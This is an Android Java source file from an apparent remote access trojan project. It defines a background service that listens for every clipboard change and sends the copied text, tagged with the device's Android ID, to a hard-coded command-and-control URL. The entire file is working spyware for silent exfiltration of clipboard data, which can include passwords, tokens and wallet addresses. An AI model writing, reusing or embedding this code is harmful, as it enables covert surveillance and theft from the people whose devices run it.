package com.example.androidrat;

import android.app.Service;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ClipboardListenerService extends Service {

    private static final String TAG = "ClipboardListener";
    private static final String C2_URL = "https://bott-production-2188.up.railway.app/rat/data";

    private ClipboardManager clipboardManager;
    private OkHttpClient httpClient;
    private String deviceId;

    private final ClipboardManager.OnPrimaryClipChangedListener clipChangedListener = new ClipboardManager.OnPrimaryClipChangedListener() {
        @Override
        public void onPrimaryClipChanged() {
            Log.d(TAG, "Clipboard content changed.");
            if (clipboardManager.hasPrimaryClip() && clipboardManager.getPrimaryClip().getItemCount() > 0) {
                CharSequence text = clipboardManager.getPrimaryClip().getItemAt(0).getText();
                if (text != null) {
                    String clipboardText = text.toString();
                    Log.i(TAG, "New clipboard text: " + clipboardText);
                    sendClipboardData(clipboardText);
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        httpClient = new OkHttpClient();
        // Get unique device ID
        try {
            deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            Log.e(TAG, "Failed to get device ID.", e);
            deviceId = "unknown_device";
        }
        Log.d(TAG, "ClipboardListenerService created for device ID: " + deviceId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ClipboardListenerService started.");
        clipboardManager.addPrimaryClipChangedListener(clipChangedListener);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (clipboardManager != null) {
            clipboardManager.removePrimaryClipChangedListener(clipChangedListener);
        }
        Log.d(TAG, "ClipboardListenerService destroyed.");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void sendClipboardData(String clipboardContent) {
        JSONObject json = new JSONObject();
        try {
            JSONObject dataObject = new JSONObject();
            dataObject.put("text", clipboardContent);

            json.put("deviceId", deviceId);
            json.put("dataType", "clipboard");
            json.put("data", dataObject);
        } catch (JSONException e) {
            Log.e(TAG, "Failed to create JSON for clipboard data", e);
            return;
        }

        RequestBody body = RequestBody.create(json.toString(), MediaType.get("application/json; charset=utf-8"));

        Request request = new Request.Builder()
                .url(C2_URL)
                .post(body)
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.e(TAG, "Failed to send clipboard data to C2", e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.i(TAG, "Successfully sent clipboard data to C2.");
                } else {
                    Log.e(TAG, "Failed to send clipboard data to C2. Response code: " + response.code() + " | Body: " + response.body().string());
                }
                response.close();
            }
        });
    }
}
